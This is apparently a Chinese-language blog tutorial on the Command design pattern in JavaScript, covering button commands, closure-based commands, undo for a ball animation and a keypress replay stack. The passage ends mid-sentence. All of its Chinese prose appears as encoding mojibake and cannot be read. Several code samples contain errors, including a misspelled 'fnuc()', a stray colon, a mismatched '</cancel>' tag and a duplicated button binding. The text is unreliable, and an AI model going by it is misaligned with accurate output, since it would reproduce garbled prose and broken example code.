ä¸ºé¡¹ç›®æ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å†³å®šè®©æŸä¸ªç¨‹åºå‘˜è´Ÿè´£ç»˜åˆ¶è¿™äº›æŒ‰é’®ï¼Œè€Œå¦å¤–ä¸€ä¸ªç¨‹åºå‘˜åˆ™è´Ÿè´£ç¼–å†™ç‚¹å‡»æŒ‰é’®åŽçš„å…·ä½“è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºéƒ½å°è£…åœ¨ äº†å¯¹è±¡é‡Œé¢ã€‚ åœ¨å¤§åž‹é¡¹ç›®å¼€å‘ä¸­ï¼Œè¿™æ˜¯å¾ˆæ­£å¸¸çš„åˆ†å·¥ï¼Œå¯¹äºŽç»˜åˆ¶æŒ‰é’®çš„ç¨‹åºå‘˜æ¥è¯´ï¼Œä»–å®Œå…¨ä¸çŸ¥é“æŸä¸ªæŒ‰é’®æœªæ¥å°†ç”¨æ¥åšä»€ä¹ˆï¼Œå¯èƒ½ç”¨æ¥åˆ·æ–°èœå•ç•Œé¢ï¼Œä¹Ÿå¯èƒ½æ¥å¢žåŠ ä¸€äº›å­èœå•ï¼Œä»–åªçŸ¥é“ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ä¼šå‘ç”ŸæŸäº›äº‹æƒ…ã€‚é‚£ä¹ˆå½“å®Œæˆè¿™ä¸ªæŒ‰é’®çš„ç»˜åˆ¶ä¹‹åŽï¼Œåº”è¯¥å¦‚ä½•ç»™å®ƒç»‘å®š onclickäº‹ä»¶å‘¢ï¼Ÿ æœ‰æ—¶å€™éœ€è¦å‘æŸäº›å¯¹è±¡å‘é€è¯·æ±‚ï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“è¯·æ±‚çš„æŽ¥æ”¶è€…æ˜¯è°ï¼Œä¹Ÿä¸çŸ¥é“è¢«è¯·æ±‚çš„æ“ä½œæ˜¯ä»€ä¹ˆï¼Œæ­¤æ—¶å¸Œæœ›ç”¨ä¸€ç§æ¾è€¦åˆçš„æ–¹å¼æ¥è®¾è®¡è½¯ä»¶ï¼Œä½¿å¾—è¯·æ±‚å‘é€è€…å’Œè¯·æ±‚æŽ¥æ”¶è€…èƒ½å¤Ÿæ¶ˆé™¤å½¼æ­¤ä¹‹é—´çš„è€¦åˆå…³ç³» æˆ‘ä»¬å¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°è¿™é‡Œè¿ç”¨å‘½ä»¤æ¨¡å¼çš„ç†ç”±ï¼šç‚¹å‡»äº†æŒ‰é’®ä¹‹åŽï¼Œå¿…é¡»å‘æŸäº›è´Ÿè´£å…·ä½“è¡Œä¸ºçš„å¯¹è±¡å‘é€è¯·æ±‚ï¼Œè¿™äº›å¯¹è±¡å°±æ˜¯è¯·æ±‚çš„æŽ¥æ”¶è€…ã€‚ä½†æ˜¯ç›®å‰å¹¶ä¸ä¸çŸ¥é“æŽ¥æ”¶è€…æ˜¯ä»€ä¹ˆå¯¹è±¡ï¼Œä¸çŸ¥é“æŽ¥æ”¶è€…ç©¶ç«Ÿä¼šåšä»€ä¹ˆã€‚æ­¤æ—¶æˆ‘ä»¬éœ€è¦å€ŸåŠ©å‘½ä»¤å¯¹è±¡çš„å¸®åŠ©ï¼Œä»¥ä¾¿è§£å¼€æŒ‰é’®å’Œè´Ÿè´£å…·ä½“è¡Œä¸ºå¯¹è±¡ä¹‹é—´çš„è€¦åˆã€‚ è®¾è®¡æ¨¡å¼çš„ä¸»é¢˜æ€»æ˜¯æŠŠä¸å˜çš„äº‹ç‰©å’Œå˜åŒ–çš„äº‹ç‰©åˆ†ç¦»å¼€æ¥ï¼Œå‘½ä»¤æ¨¡å¼ä¹Ÿä¸ä¾‹å¤–ã€‚æŒ‰ä¸‹æŒ‰é’®ä¹‹åŽä¼šå‘ç”Ÿä¸€äº›äº‹æƒ…æ˜¯ä¸å˜çš„ï¼Œè€Œå…·ä½“ä¼šå‘ç”Ÿä»€ä¹ˆæ˜¯å¯å˜çš„ã€‚é€šè¿‡ command å¯¹è±¡çš„å¸®åŠ©ï¼Œå°†æ¥æˆ‘ä»¬å¯ä»¥è½»æ˜“åœ°æ”¹å˜è¿™ç§å…³è”ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åœ¨å°†æ¥å†æ¬¡æ”¹å˜æŒ‰é’®çš„è¡Œä¸ºã€‚ ä¸‹é¢æ˜¯ä»£ç çš„ç¼–å†™é˜¶æ®µï¼Œé¦–å…ˆåœ¨é¡µé¢ä¸­å®Œæˆè¿™äº›æŒ‰é’®çš„ â€œç»˜åˆ¶â€ï¼š 12345678910&lt;body&gt; &lt;button id="button1"&gt;ç‚¹å‡»æŒ‰é’®1&lt;/button&gt; &lt;button id="button2"&gt;ç‚¹å‡»æŒ‰é’®2&lt;/button&gt; &lt;button id="button3"&gt;ç‚¹å‡»æŒ‰é’®3&lt;/button&gt; &lt;script&gt; var button1 = document.getElementById( 'button1' ); var button2 = document.getElementById( 'button2' ); var button3 = document.getElementById( 'button3' ); &lt;/script&gt;&lt;/body&gt; å®šä¹‰ setCommand å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è´Ÿè´£å‘ä¸Šé¢çš„æŒ‰é’®å®‰è£…å‘½ä»¤ï¼Œå¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œç‚¹å‡»æŒ‰é’®ä¼šæ‰§è¡ŒæŸä¸ª command å‘½ä»¤ï¼Œæ‰§è¡Œå‘½ä»¤çš„åŠ¨ä½œè¢«çº¦å®šä¸ºè°ƒç”¨ command å¯¹è±¡çš„ execute() æ–¹æ³•ã€‚è™½ç„¶ä¸çŸ¥é“å‘½ä»¤ç©¶ç«Ÿä»£è¡¨ç€ä»€ä¹ˆæ“ä½œï¼Œä½†è´Ÿè´£ç»˜åˆ¶æŒ‰é’®çš„ç¨‹åºå‘˜å¹¶ä¸å…³å¿ƒè¿™äº›äº‹æƒ…ï¼Œä»–åªéœ€è¦é¢„ç•™å¥½å®‰è£…å‘½ä»¤çš„æŽ¥å£ï¼Œ command å¯¹è±¡è‡ªç„¶çŸ¥é“å¦‚ä½•å’Œæ­£ç¡®çš„å¯¹è±¡æ²Ÿé€šï¼š 12345var setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute(); &#125;&#125; æœ€åŽï¼Œè´Ÿè´£ç¼–å†™ç‚¹å‡»æŒ‰é’®ä¹‹åŽçš„å…·ä½“è¡Œä¸ºçš„ç¨‹åºå‘˜äº¤ä¸Šäº†æˆæžœï¼Œå®Œæˆäº†åˆ·æ–°èœå•ç•Œé¢ã€å¢žåŠ å­èœå•å’Œåˆ é™¤å­èœå•è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œè¿™å‡ ä¸ªåŠŸèƒ½è¢«åˆ†å¸ƒåœ¨ MenuBar å’Œ SubMenu è¿™ä¸¤ä¸ªå¯¹è±¡ä¸­ï¼š 1234567891011121314var MenuBar = &#123; refresh:function()&#123; console.log('åˆ·æ–°èœå•ç›®å½•'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('å¢žåŠ å­èœå•'); &#125;, del:function()&#123; console.log('åˆ é™¤å­èœå•'); &#125;&#125; ä¸ºè®© button å˜å¾—æœ‰ç”¨èµ·æ¥ï¼Œæˆ‘ä»¬è¦å…ˆæŠŠä¹‹å‰è¿™äº›è¡Œä¸ºéƒ½å°è£…åœ¨å‘½ä»¤ç±»ä¸­ï¼š 12345678910111213141516171819202122232425262728293031323334var MenuBar = &#123; refresh:function()&#123; console.log('åˆ·æ–°èœå•ç›®å½•'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('å¢žåŠ å­èœå•'); &#125;, del:function()&#123; console.log('åˆ é™¤å­èœå•'); &#125;&#125;var RefreshMenuBarCommand = function(receiver)&#123; this.receiver = receiver;&#125;RefreshMenuBarCommand.prototype.execute = function()&#123; this.receiver.refresh();&#125;var AddSubMenuCommand = function(receiver)&#123; this.receiver = receiver;&#125;AddSubMenuCommand.prototype.execute = function()&#123; this.receiver.add();&#125; var DelSubMenuCommand = function(receiver)&#123; this.receiver = receiver;&#125;DelSubMenuCommand.prototype.execute = function()&#123; this.receiver.del();&#125; æœ€åŽå°±æ˜¯æŠŠå‘½ä»¤æŽ¥å—è€…ä¼ å…¥åˆ° command å¯¹è±¡ä¸­ï¼Œå¹¶ä¸”æŠŠ command å¯¹è±¡å®‰è£…åˆ° button ä¸Šé¢ï¼š 1234567var refreshMenuBarCommand = new RefreshMenuBarCommand(MenuBar);var addSubMenuCommand = new AddSubMenuCommand(SubMenu);var delSubMenuCommand = new DelSubMenuCommand(SubMenu);setCommand(button1,refreshMenuBarCommand);setCommand(button2,addSubMenuCommand);setCommand(button3,delSubMenuCommand); ä»¥ä¸Šåªæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„å‘½åæ¨¡å¼ç¤ºä¾‹ï¼Œä½†ä»Žä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ˜¯å¦‚ä½•æŠŠè¯·æ±‚å‘é€è€…å’Œè¯·æ±‚æŽ¥æ”¶è€…è§£è€¦å¼€çš„ã€‚ JavaScript ä¸­çš„å‘½ä»¤æ¨¡å¼å¯èƒ½æˆ‘ä»¬ä¼šè§‰å¾—å¾ˆå¥‡æ€ªï¼Œæ‰€è°“çš„å‘½ä»¤æ¨¡å¼å°±æ˜¯ç»™å¯¹è±¡çš„çš„æŸä¸ªæ–¹æ³•å–äº† execute çš„åå­—ï¼Œå¼•å…¥ command å¯¹è±¡å’Œ receiver è¿™ä¸¤ä¸ªæ— ä¸­ç”Ÿæœ‰çš„è§’è‰²æ— éžæ˜¯æŠŠç®€å•çš„äº‹æƒ…å¤æ‚åŒ–äº†ï¼Œå³ä½¿ä¸å¼•ç”¨ä»€ä¹ˆæ¨¡å¼ï¼Œä¸‹é¢å‡ è¡Œä»£ç å°±å¯ä»¥å®žçŽ°ç›¸åŒçš„åŠŸèƒ½ï¼š 1234567891011121314151617181920var bindClick = function(button,func)&#123; button.onclick = func;&#125;var MenuBar = &#123; refresh:function()&#123; console.log('åˆ·æ–°èœå•ç›®å½•'); &#125;&#125;var SubMenu = &#123; add:function()&#123; console.log('å¢žåŠ å­èœå•'); &#125;, del:function()&#123; console.log('åˆ é™¤å­èœå•'); &#125;&#125;bindClick(button1,MenuBar.refresh);bindClick(button2,SubMenu.add);bindClick(button2,SubMenu.del); è¿™ç§è¯´è¯æ˜¯æ­£ç¡®çš„ï¼Œä¸Šé¢ä»£ç æ˜¯æ¨¡æ‹Ÿä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€çš„å‘½ä»¤æ¨¡å¼å®žçŽ°ã€‚å‘½ä»¤æ¨¡å¼å°†è¿‡ç¨‹å¼çš„è¯·æ±‚è°ƒç”¨å°è£…åœ¨ commandå¯¹è±¡ execute æ–¹æ³•é‡Œï¼Œé€šè¿‡å°è£…æ–¹æ³•è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿ç®—å—åŒ…è£…æˆå½¢ã€‚command å¯¹è±¡å¯ä»¥è¢«å››å¤„ä¼ é€’ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨å‘½ä»¤çš„æ—¶å€™ï¼Œå®¢æˆ·ä¸éœ€è¦å…³å¿ƒäº‹æƒ…æ˜¯å¦‚ä½•è¿›è¡Œçš„ã€‚ å‘½ä»¤æ¨¡å¼çš„ç”±æ¥ï¼Œå…¶å®žæ˜¯å›žè°ƒå‡½æ•°çš„ä¸€ä¸ªé¢å‘å¯¹è±¡çš„æ›¿ä»£å“ã€‚ JavaScript ä½œä¸ºå°†å‡½æ•°ä½œä¸ºä¸€ç­‰å¯¹è±¡çš„è¯­è¨€ï¼Œè·Ÿç­–ç•¥æ¨¡å¼ä¸€æ ·ï¼Œå‘½ä»¤æ¨¡å¼ä¹Ÿæ—©å·²èžå…¥åˆ°äº† JavaScript è¯­è¨€ä¹‹ä¸­ã€‚è¿ç®—å—ä¸ä¸€å®šè¦å°è£…åœ¨ command.execute æ–¹æ³•ä¸­ï¼Œä¹Ÿå¯ä»¥å°è£…åœ¨æ™®é€šå‡½æ•°ä¸­ã€‚å‡½æ•°ä½œä¸ºä¸€ç­‰å¯¹è±¡ï¼Œæœ¬èº«å°±å¯ä»¥å››å¤„ä¼ é€’ã€‚å³ä½¿æˆ‘ä»¬ä¾ç„¶éœ€è¦è¯·æ±‚â€œæŽ¥æ”¶è€…â€ï¼Œä¹Ÿæœªå¿…ä½¿ç”¨é¢å‘å¯¹è±¡çš„æ–¹å¼ï¼Œé—­åŒ…å¯ä»¥å®ŒæˆåŒæ ·çš„åŠŸèƒ½ã€‚ åœ¨é¢å‘å¯¹è±¡è®¾è®¡ä¸­ï¼Œå‘½ä»¤æ¨¡å¼çš„æŽ¥æ”¶è€…è¢«å½“æˆ command å¯¹è±¡çš„å±žæ€§ä¿å­˜èµ·æ¥ã€‚åŒæ—¶çº¦å®šæ‰§è¡Œå‘½ä»¤çš„æ“ä½œè°ƒç”¨ command.execute æ–¹æ³•ã€‚åœ¨ä½¿ç”¨é—­åŒ…çš„å‘½ä»¤æ¨¡å¼çš„å®žçŽ°ä¸­ï¼ŒæŽ¥æ”¶è€…è¢«å°é—­åœ¨é—­åŒ…äº§ç”Ÿçš„çŽ¯å¢ƒä¸­ï¼Œæ‰§è¡Œå‘½ä»¤çš„æ“ä½œå¯ä»¥æ›´åŠ ç®€å•ï¼Œä»…ä»…æ‰§è¡Œå›žè°ƒå‡½æ•°å³å¯ã€‚æ— è®ºæŽ¥æ”¶è€…è¢«ä¿å­˜ä¸ºå¯¹è±¡çš„å±žæ€§ï¼Œè¿˜æ˜¯è¢«å°é—­åœ¨é—­åŒ…çš„çŽ¯å¢ƒä¸­ï¼Œåœ¨å°†æ¥æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼ŒæŽ¥æ”¶è€…éƒ½å¯ä»¥è¢«é¡ºåºè®¿é—®ï¼Œç”¨é—­åŒ…å®žçŽ°çš„å‘½ä»¤æ¨¡å¼å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š 123456789101112131415161718192021var setCommand = function(button,func)&#123; button.onclick = function()&#123; fnuc(); &#125;&#125;var MenuBar = &#123; refresh:function()&#123; console.log('åˆ·æ–°èœå•ç›®å½•'); &#125;&#125;var RefreshMenuBarCommand = function(receiver)&#123; return function()&#123; receiver.refresh(): &#125;&#125;var refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);setCommand(button1,refreshMenuBarCommand); å½“ç„¶ï¼Œå¦‚æžœæƒ³æ›´æ˜Žç¡®åœ°è¡¨è¾¾å½“å‰æ­£åœ¨ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œæˆ–è€…é™¤äº†æ‰§è¡Œå‘½ä»¤ä¹‹å¤–ï¼Œå°†æ¥è¿˜æœ‰å¯èƒ½è¦æä¾›æ’¤é”€å‘½ä»¤ç­‰æ“ä½œã€‚æ‰€ä»¥æœ€å¥½è¿˜æ˜¯æŠŠæ‰§è¡Œå‡½æ•°æ”¹ä¸ºè°ƒç”¨ execute æ–¹æ³•ï¼š 1234567891011121314var RefreshMenuBarCommand = function(receiver)&#123; return &#123; execute:function()&#123; receiver.refresh(): &#125; &#125;&#125;var setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute(); &#125;&#125;var refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);setCommand(button1,refreshMenuBarCommand); æ’¤é”€å‘½ä»¤å‘½ä»¤æ¨¡å¼çš„ä½œç”¨ä¸ä»…æ˜¯å°è£…è¿ç®—å—ï¼Œè€Œä¸”å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç»™å‘½ä»¤å¯¹è±¡å¢žåŠ æ’¤é”€æ“ä½œã€‚å°±åƒæ˜¯è®¢é¤æ—¶å®¢äººå¯ä»¥é€šè¿‡ç”µè¯æ¥å–æ¶ˆè®¢å•ä¸€æ ·ã€‚ä¸‹é¢çœ‹çœ‹æ’¤é”€å‘½ä»¤çš„ä¾‹å­ã€‚ ç”¨ç­–ç•¥æ¨¡å¼ä¸­çš„å°çƒè¿åŠ¨ Animate ç±»ç¼–å†™ä¸€ä¸ªåŠ¨ç”»ï¼Œè¿™ä¸ªåŠ¨ç”»çš„è¡¨çŽ°æ˜¯è®©é¡µé¢ä¸Šçš„å°çƒç§»åŠ¨åˆ°æ°´å¹³æ–¹æ³•çš„ä½ç½®ã€‚çŽ°åœ¨é¡µé¢ä¸­æœ‰ä¸€ä¸ª input æ–‡æœ¬æ¡†å’Œ button æŒ‰é’®ï¼Œæ–‡æœ¬æ¡†ä¸­å¯ä»¥è¾“å…¥ä¸€äº›æ•°å­—ï¼Œè¡¨ç¤ºå°çƒç§»åŠ¨åŽçš„æ°´å¹³ä½ç½®ï¼Œå°çƒåœ¨ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åŽç«‹åˆ»å¼€å§‹ç§»åŠ¨ï¼š 123456789101112131415&lt;body&gt; &lt;div id="ball" style="position:absolute;background:#000;width:50px;height:50px"&gt;&lt;/div&gt; è¾“å…¥å°çƒç§»åŠ¨åŽçš„ä½ç½®ï¼š&lt;input id="pos"/&gt; &lt;button id="moveBtn"&gt;å¼€å§‹ç§»åŠ¨&lt;/button&gt; &lt;/body&gt;&lt;script&gt;var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');moveBtn.onclick = function()&#123; var animate = new Animate(ball); animate.start('left',pos.value,1000,'strongEaseOut');&#125;&lt;/script&gt; æŽ¥ç€å†å®žçŽ°ä¸€ä¸ªæ’¤é”€åŠŸèƒ½ï¼Œé¡µé¢ä¸Šæœ‰ä¸€ä¸ªæ’¤é”€æŒ‰é’®ï¼Œç‚¹å‡»æŒ‰é’®ä¹‹åŽï¼Œå°çƒä¾¿å¯ä»¥å›žåˆ°ä¸Šä¸€æ¬¡çš„ä½ç½®ã€‚ åœ¨ç»™é¡µé¢å¢žåŠ æ’¤é”€æŒ‰é’®ä¹‹åŽï¼Œå…ˆæŠŠä¹‹å‰çš„ä»£ç æ”¹ä¸ºç”¨å‘½ä»¤æ¨¡å¼å®žçŽ°ï¼š 1234567891011121314151617var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');var MoveCommand = function(receiver,pos)&#123; this.receiver = receiver; this.pos = pos;&#125;MoveCommand.prototype.execute = function()&#123; this.receiver.start('left',this.pos,1000,'strongEaseOut');&#125;var moveCommand;moveBtn.onclick = function()&#123; var animate = new Animate(ball); moveCommand = new MoveCommand(animate,pos.value); moveCommand.execute(); &#125; æŽ¥ä¸‹æ¥å¢žåŠ æ’¤é”€æŒ‰é’®ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;body&gt; &lt;div id="ball" style="position:absolute;background:#000;width:50px;height:50px"&gt;&lt;/div&gt; è¾“å…¥å°çƒç§»åŠ¨åŽçš„ä½ç½®ï¼š&lt;input id="pos"/&gt; &lt;button id="moveBtn"&gt;å¼€å§‹ç§»åŠ¨&lt;/button&gt; &lt;button id="cancelBtn"&gt;cancel&lt;/cancel&gt; &lt;!--å¢žåŠ å–æ¶ˆæŒ‰é’®--&gt; &lt;/body&gt;&lt;script&gt;var ball = document.getElementById('ball');var pos = document.getElementById('pos');var moveBtn = document.getElementById('moveBtn');var cancelBtn = document.getElementById('cancelBtn');var MoveCommand = function(receiver,pos)&#123; this.receiver = receiver; this.pos = pos; this.oldPos = null;&#125;MoveCommand.prototype.execute = function()&#123; this.receiver.start('left',this.pos,1000,'strongEaseOut'); this.oldPos = this.receiver.dom.getBoundingClientRect()[ this.receiver.propertyName ]; &#125; MoveCommand.prototype.undo = function()&#123; console.log(this.oldPos); console.log(this.receiver); this.receiver.start('left',this.oldPos,1000,'strongEaseOut');&#125;var moveCommand;moveBtn.onclick = function()&#123; var animate = new Animate(ball); moveCommand = new MoveCommand(animate,pos.value); moveCommand.execute(); &#125;cancelBtn.onclick = function()&#123; moveCommand.undo();&#125;&lt;/script&gt; çŽ°åœ¨é€šè¿‡å‘½ä»¤æ¨¡å¼å¯ä»¥è½»æ¾å®žçŽ°äº†æ’¤é”€åŠŸèƒ½ï¼Œå¦‚æžœç”¨æ™®é€šçš„æ–¹æ³•è°ƒç”¨æ¥å®žçŽ°ï¼Œä¹Ÿè®¸éœ€è¦æ¯æ¬¡éƒ½æ‰‹å·¥å‡ çŽ‡å°çƒçš„è¿åŠ¨è½¨è¿¹ï¼Œæ‰èƒ½è®©å®ƒè¿˜åŽŸåˆ°ä¹‹å‰çš„ä½ç½®ã€‚è€Œå‘½ä»¤æ¨¡å¼ä¸­å°çƒçš„åŽŸå§‹ä½ç½®åœ¨å°çƒå¼€å§‹ç§»åŠ¨å‰å·²ç»ä½œä¸º command å¯¹è±¡çš„å±žæ€§ä¿å­˜èµ·æ¥äº†ï¼Œæ‰€ä»¥åªéœ€è¦å†æä¾›ä¸€ä¸ª undo æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨ undo æ–¹æ³•ä¸­è®©å°çƒå›žåˆ°åˆšåˆšè®°å½•çš„åŽŸå§‹ä½ç½®å°±å¯ä»¥äº†ã€‚ æ’¤é”€æ˜¯ä¸€ä¸ªéžå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ’¤é”€å‘½ä»¤è¿˜å¯ä»¥ç”¨äºŽå®žçŽ°æ–‡æœ¬ç¼–è¾‘å™¨çš„ ctrl+z åŠŸèƒ½ã€‚ æ’¤é”€å’Œé‡åšå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç³»åˆ—çš„å‘½ä»¤ï¼Œæ¯”å¦‚åœ¨ä¸€ä¸ªå›´æ£‹ç¨‹åºä¸­ï¼ŒçŽ°åœ¨å·²ç»ä¸‹äº† 10 æ­¥æ£‹äº†ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¡æ€§æ‚”æ£‹åˆ°ç¬¬ 5 æ­¥ï¼Œåœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰æ‰§è¡Œè¿‡çš„ä¸‹æ£‹å‘½ä»¤éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªåŽ†å²åˆ—è¡¨ä¸­ï¼Œç„¶åŽå€’åºå¾ªçŽ¯æ¥æ‰§è¡Œè¿™äº›å‘½ä»¤çš„ undo æ“ä½œï¼Œç›´åˆ°å¾ªçŽ¯æ‰§è¡Œåˆ°ç¬¬äº”ä¸ªå‘½ä»¤ä¸ºæ­¢ã€‚ ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–çš„ï¼Œåœ¨ canvas ç”»å›¾ç¨‹åºä¸­ï¼Œç”»å¸ƒä¸Šæœ‰ä¸€äº›ç‚¹ï¼Œæˆ‘ä»¬åœ¨è¿™äº›ç‚¹ä¹‹é—´ç”»äº† N æ¡æ›²çº¿æŠŠè¿™äº›ç‚¹äº’ç›¸è¿žæŽ¥èµ·æ¥ï¼Œå½“ç„¶æ˜¯ç”¨å‘½ä»¤æ¨¡å¼æ¥å®žçŽ°çš„ã€‚ä½†æ˜¯å´å¾ˆéš¾ä¸ºè¿™é‡Œçš„å‘½ä»¤å¯¹è±¡å®šä¹‰ä¸€ä¸ªæ“¦é™¤æŸæ¡æ›²çº¿çš„undo æ“ä½œï¼Œå› ä¸ºåœ¨ Canvas ç”»å›¾ä¸­ï¼Œæ“¦é™¤ä¸€æ¡çº¿ç›¸å¯¹ä¸å®¹æ˜“å®žçŽ°ã€‚ è¿™æ—¶å€™æœ€å¥½çš„åŠžæ³•æ˜¯å…ˆæ“¦é™¤ç”»å¸ƒï¼Œç„¶åŽæŠŠåˆšåˆšæ‰§è¡Œè¿‡ä¸€éçš„å‘½ä»¤é‡æ–°æ‰§è¡Œä¸€éï¼Œè¿™ä¸€ç‚¹åŒæ ·å¯ä»¥åˆ©ç”¨ä¸€ä¸ªåŽ†å²åˆ—è¡¨å †æ ˆæ¥å®žçŽ°ã€‚è®°å½•å‘½ä»¤æ—¥å¿—ï¼Œç„¶åŽé‡å¤æ‰§è¡Œå®ƒä»¬ï¼Œè¿™æ˜¯é€†è½¬ä¸å¯é€†å‘½ä»¤çš„ä¸€ä¸ªå¥½æ–¹æ³•ã€‚ å‘½ä»¤æ¨¡å¼å¯ä»¥ç”¨æ¥å®žçŽ°æ’­æ”¾å½•åƒåŠŸèƒ½ï¼ŒåŽŸç†è·Ÿ Canvas ç”»å›¾çš„ä¾‹å­ä¸€æ ·ï¼Œæˆ‘ä»¬æŠŠç”¨æˆ·åœ¨é”®ç›˜çš„è¾“å…¥éƒ½å°è£…æˆå‘½ä»¤ï¼Œæ‰§è¡Œè¿‡çš„å‘½ä»¤å°†è¢«å­˜æ”¾åˆ°å †æ ˆä¸­ã€‚æ’­æ”¾å½•åƒçš„æ—¶å€™åªéœ€è¦ä»Žå¤´å¼€å§‹ä¾æ¬¡æ‰§è¡Œè¿™äº›å‘½ä»¤å°±å¯ä»¥äº†ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142var Ryu = &#123; attack:function()&#123; console.log('æ”»å‡»'); &#125;, defense:function()&#123; console.log('é˜²å¾¡'); &#125;, jump:function()&#123; console.log('è·³è·ƒ'); &#125;, crouch:function()&#123; console.log('è¹²ä¸‹'); &#125;&#125;var makeCommand = function(receiver,state)&#123; // åˆ›å»ºå‘½ä»¤ return function()&#123; receiver[state](); &#125;&#125;var commands = &#123; "119":"jump", // W "115":"crouch", // S "97":"defense", // A "100":"attack" // D&#125;var commandStack = []; // ä¿å­˜å‘½ä»¤çš„å †æ ˆdocument.onkeypress = function(ev)&#123; var keyCode = ev.keyCode, command = makeCommand(Ryu,commands[keyCode]); if(command)&#123; command(); // æ‰§è¡Œå‘½ä»¤ commandStack.push(command); // å°†åˆšåˆšæ‰§è¡Œè¿‡çš„å‘½ä»¤ä¿å­˜è¿›å †æ ˆ &#125;&#125;document.getElementById('replay').onclick = function()&#123; var command; while(command = commandStack.shift())&#123; // ä»Žå †æ ˆä¸­å–å‡ºå‘½ä»¤å¹¶ä¾æ¬¡æ‰§è¡Œ command(); &#125;&#125;; å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬åœ¨é”®ç›˜ä¸Šæ•²ä¸‹ Wã€Aã€Sã€D è¿™å‡ ä¸ªé”®æ¥å®Œæˆä¸€äº›åŠ¨ä½œä¹‹åŽï¼Œå†æŒ‰ä¸‹ ReplayæŒ‰é’®ï¼Œæ­¤æ—¶ä¾¿ä¼šé‡å¤æ’­æ”¾ä¹‹å‰çš„åŠ¨ä½œã€‚ å‘½ä»¤é˜Ÿåˆ—åœ¨è®¢é¤çš„æ•…äº‹ä¸­ï¼Œå¦‚æžœè®¢é¤çš„æ•°é‡è¿‡å¤šè€ŒåŽ¨å¸ˆçš„äººæ‰‹ä¸å¤Ÿç”¨ï¼Œåˆ™å¯ä»¥è®©è¿™äº›è®¢å•æŽ’é˜Ÿè¿›è¡Œå¤„ç†ã€‚ç¬¬ä¸€ä¸ªè®¢å•å®Œæˆä¹‹åŽï¼Œå†å¼€å§‹æ‰§è¡Œè·Ÿç¬¬äºŒä¸ªè®¢å•æœ‰å…³çš„æ“ä½œã€‚ é˜Ÿåˆ—åœ¨åŠ¨ç”»ä¸­çš„è¿ç”¨åœºæ™¯ä¹Ÿéžå¸¸å¤šï¼Œæ¯”å¦‚ä¹‹å‰çš„å°çƒè¿åŠ¨ç¨‹åºæœ‰å¯èƒ½é‡åˆ°å¦å¤–çš„ä¸€ä¸ªé—®é¢˜ï¼š æœ‰äº›ç”¨æˆ·åé¦ˆï¼Œè¿™ä¸ªç¨‹åºåªé€‚åˆ APM å°äºŽ20 çš„äººç¾¤ï¼Œå¤§éƒ¨åˆ†ç”¨æˆ·éƒ½æœ‰å¿«é€Ÿç‚¹å‡»æŒ‰é’®çš„ä¹ æƒ¯ï¼Œå½“ç”¨æˆ·ç¬¬äºŒæ¬¡ç‚¹å‡» button çš„æ—¶å€™ï¼Œæ­¤æ—¶å°çƒçš„å‰ä¸€ä¸ªåŠ¨ç”»å°šæœªç»“æŸï¼ŒäºŽæ˜¯å‰ä¸€ä¸ªåŠ¨ç”»ä¼šéª¤ç„¶åœæ­¢ï¼Œå°çƒè½¬è€Œå¼€å§‹ç¬¬äºŒä¸ªåŠ¨ç”»çš„è¿åŠ¨è¿‡ç¨‹ã€‚ä½†è¿™å¹¶ä¸æ˜¯ç”¨æˆ·çš„æœŸæœ›ï¼Œç”¨æˆ·å¸Œæœ›è¿™ä¸¤ä¸ªåŠ¨ç”»ä¼šæŽ’é˜Ÿè¿›è¡Œã€‚ æŠŠè¯·æ±‚å°è£…æˆå‘½ä»¤å¯¹è±¡çš„ä¼˜ç‚¹åœ¨è¿™é‡Œä½“çŽ°å‡ºæ¥äº†ï¼Œå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå‡ ä¹Žæ˜¯æ°¸ä¹…çš„ï¼Œé™¤éžæˆ‘ä»¬ä¸»åŠ¨åŽ»å›žå®ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‘½ä»¤å¯¹è±¡çš„å£°æ˜Žå‘¨æœŸè·Ÿåˆå§‹è¯·æ±‚å‘ç”Ÿçš„æ—¶é—´æ²¡æœ‰å…³ç³»ï¼Œcommand å¯¹è±¡çš„ execute 